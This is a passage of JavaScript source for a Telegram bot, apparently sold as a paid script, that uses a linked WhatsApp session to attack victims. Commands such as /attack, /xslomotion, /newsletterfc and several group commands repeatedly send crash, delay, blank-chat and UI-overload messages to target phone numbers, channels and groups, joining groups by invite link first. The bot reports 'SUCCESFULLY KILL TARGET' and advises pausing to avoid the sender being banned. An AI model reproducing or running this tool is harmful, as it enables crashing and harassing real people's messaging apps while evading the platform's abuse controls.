  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @Raffioffci2 あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tʀᴀsʜ ☇ Mᴇɴᴜ",
        callback_data: "attackmenu_menu", style: "danger",
      },
      {
        text: "Mᴅ ☇ Mᴇɴᴜ",
        callback_data: "group_menu", style: "primary",
      },
    ],
    [
      {
        text: "Tʜᴀɴᴋs ☇ Tᴏ",
        callback_data: "thanks_menu", style: "danger",
      },
    ],
    [
      {
        text: "Cᴏɴᴛʀᴏʟ ☇ Mᴇɴᴜ",
        callback_data: "owner_menu", style: "primary"
      },
    ],
    [
      {
        text: "Bᴜʏ ☇ Sᴄʀɪᴘᴛ",
        callback_data: "buy_menu", style: "success",
      },      
    ],
    [
      {
        text: "Oᴡɴᴇʀ ☇ Sᴄʀɪᴘᴛ",
        url: "https://t.me/Raffioffci2", style: "danger",
      },      
      {
        text: "Cʜᴀɴɴᴇʟ ☇ Oᴡɴᴇʀ",
        url: "https://t.me/kayzoreal", style: "primary",
      },
    ],
    [
      {
        text: "➕ Aᴅᴅ ☇ Bᴏᴛ ",
        url: "https://t.me/sennjboaddbot?startgroup=false", style: "success",        },           
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.command("attack", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`

    : ctx.from.first_name || "User";
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Example: /attack 62xxx");

    const cleanNumber = q.replace(/[^0-9]/g, '');
    const finalNumber = `${cleanNumber}@s.whatsapp.net`;
    const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 

    const caption = `
「©️ @sennsofhopee 」
⫹⫺ - +${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚
`;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "𝗙𝗢𝗥𝗖𝗘 𝗜𝗣𝗛𝗢𝗡𝗘 👻", callback_data: `attack_iosinvinity:${finalNumber}` },
                    { text: "𝗗𝗘𝗟𝗔𝗬 𝗩𝗜𝗦𝗜𝗕𝗟𝗘 🧬", callback_data: `attack_carousel:${finalNumber}` },    
                ],
                [
                    { text: "𝗗𝗘𝗟𝗔𝗬 𝗜𝗣𝗛𝗢𝗡𝗘 📱", callback_data: `attack_delayios:${finalNumber}` },
                    { text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝗗𝗘𝗟𝗔𝗬 🫀", callback_data: `attack_chidorkk:${finalNumber}` },                         ],
                [
                    { text: "𝗗𝗥𝗔𝗜𝗡 𝗞𝗨𝗢𝗧𝗔 🔥", callback_data: `attack_buldozer:${finalNumber}` },          
                    { text: "𝗕𝗟𝗔𝗡𝗞 𝟭 𝗠𝗦𝗚 🎁", callback_data: `attack_chidoriii:${finalNumber}` },             
                ],
                [                
                    { text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟭𝟭 🗯️", callback_data: `attack_protocoll:${finalNumber}` },
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗦𝗬𝗦𝗧𝗘𝗠 🦠", callback_data: `attack_jjmbudd:${finalNumber}` },       
                ],
                [                
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗜𝗣𝗛𝗢𝗡𝗘 👽", callback_data: `attack_delayui:${finalNumber}` },
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 💣", callback_data: `attack_uinibos:${finalNumber}` },            
                ],
                [
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗩𝗜𝗗𝗘𝗢 🥶", callback_data: `attack_chidoruu:${finalNumber}` },  
                ]
            ]
        }
    };

    await ctx.replyWithPhoto("https://files.catbox.moe/zrhmp1.jpg", {
        caption,
        ...keyboard,
    });
});
bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];

  await ctx.answerCbQuery();

  try {
    switch (bugType) {
      case "chidorkk":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await DelayInvisSpam(sock, target);
          await sleep(1500);
        }
        break;

      case "delayxinvis":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await DelayInvisSpam(sock, target);
          await sleep(1000);
        }
        break;

      case "chidoruu":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await DelayInvisSpam(sock, target);
          await sleep(2500);
        }
        break;

      case "chidoriii":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 1; i++) {
          await XProtexBlankChatV5(sock, target);
          await sleep(1000);
        }
        break;
        
      case "protocoll":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await RazzxBuldozer(target);
          await sleep(1000);
        }
        break;
        
      case "buldozer":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await RazzxBuldozer(target);
          await sleep(1000);
        }
        break;
     
      case "delayui":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 150; i++) {
          await SennUiOverload(target);
          await sleep(1000);
        }
        break;
        
      case "jjmbudd":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await SennUiOverload(target);
          await sleep(1500);
        }
        break;
        
      case "delayios":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await IPhoneDelay(target, ptcp = true);
          await sleep(1000);
        }
        break;

      case "iosinvinity":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await NewlasterFollCrashIos(sock, target);
          await sleep(1000);
        }
        break;        
                
      case "carousel":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1000);
        }
        break;

      case "poseidon":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1000);
        }
        break;

      case "chidori":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 5; i++) {
          await LocaUrlButton(sock, target, Ptcp = true);
          await sleep(1000);
        }
        break;

      case "uinibos":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await OneTapLoca(sock, target);
          await sleep(1000);
        }
        break;        

      default:
        return ctx.reply("❌ Bug tidak ditemukan.");
    }

    await ctx.replyWithPhoto("https://e.top4top.io/p_3465ccjb11.jpg", {
      caption: `\`\`\`
「 SUCCESFULLY KILL TARGET 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${cleanNumber}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
jeda 3/5 menit agar sender tidak terbanned
 \`\`\` "")}`
    });

  } catch (err) {
    console.error(err);
    await ctx.reply("Succues Sending Bug, jeda 3/5 menit agar sender tidak terbanned");
  }
});
//////// -- CASE DELAY FREE LOOP --- \\\\\\\\\\\
bot.command("xslomotion", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  
  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ").slice(1);

  const number = args[0];
  const loop = parseInt(args[1]) || 50;   // default 50
  const sleepDelay = parseInt(args[2]) || 1000; // default 1000ms

  if (!number) {
    return ctx.reply(`Example:
/xslomotion 62812xxxx 150 1000

Format:
/xslomotion nomor loop sleep(ms)`);
  }

  const target = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(
    "https://files.catbox.moe/zrhmp1.jpg",
    {
      caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${number}
☇ Loop: ${loop}
☇ Delay: ${sleepDelay} ms
☇ Status: Sending
☇ Type: /xslomotion 
`,
      parse_mode: "HTML",
    }
  );

  console.log(`Process Sending To ${target}`);

  for (let i = 0; i < loop; i++) {
    await DelayInvisSpam(sock, target);
    await sleep(sleepDelay);
    await DelayInvisSpam(sock, target);
    await sleep(sleepDelay);
  }

  await ctx.editMessageCaption(
    `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${number}
☇ Loop: ${loop}
☇ Delay: ${sleepDelay} ms
☇ Status: Succes
☇ Type: /xslomotion 

<blockquote> DONE </blockquote>
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Check ϟ Target", url: `https://wa.me/${number}` }]
        ],
      },
    }
  );
});
//////// -- CASE BUG CH --- \\\\\\\\\\\
bot.command("newsletterfc", checkWhatsAppConnection, checkPremium, async ctx => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(
      `❌ Syntax Error!\n\nUse : /newsletterfc <id channel>\nExample : /newsletterfc 120363×××\n© 𖣂-⛧☇ 𝑺͢͟𝒆͠𝒏𝒏⛧༑. ϟ`
    );

    let target = q.replace(/[^0-9]/g, '') + "@newsletter";

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 50; i++) {
      await FcCh(target);
      await sleep(3000);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
      caption: `
[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆

• 🦠 𝘛𝘺𝘱𝘦 : *Invisible Crash Newsletter*
• ⏳ 𝘚𝘵𝘢𝘵𝘶𝘴 : *Terkirim*

𝘕𝘰𝘵𝘦 :
𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕「📱」",
              url: `https://wa.me/${target}`
            }
          ]
        ]
      }
    });
});
//////// -- CASE BUG GB --- \\\\\\\\\\\
bot.command("crashnoclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashnoclickgroup https://chat.whatsapp.com/xxxx atau /crashnoclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashnoclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 50; i++) {
        await CrashChNew2026(sock, target);
        await sleep(4000);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("crashclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashclickgroup https://chat.whatsapp.com/xxxx atau /crashclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 15; i++) {
        await SennClick(target);
        await sleep(2500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("blankclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /blankclickgroup https://chat.whatsapp.com/xxxx atau /blankclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /blankclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await BlankGcSenn(target);
        await sleep(3000);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("crashclickcomu", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashclickcomu https://chat.whatsapp.com/xxxx atau /crashclickcomu 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 15; i++) {
        await SennClick(target);
        await sleep(2500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("uigroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /uigroup https://chat.whatsapp.com/xxxx atau /uigroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /uigroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await BlankNotiffButton(sock, target);
        await sleep(5500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("uicomu", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /uicomu https://chat.whatsapp.com/xxxx atau /uicomu 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /uicomu
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await BlankNotiffButton(sock, target);
        await sleep(5500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("comboblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);  
      await BlankInteractiveNewVnX(sock, target);
      await DenixAmpas(target);   
      await sleep(1000);
    }
  })();
});
bot.command("blankloca", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await BlankNotiffButton(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("vionixlayinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /vionixlayinvis 62xxxx`);
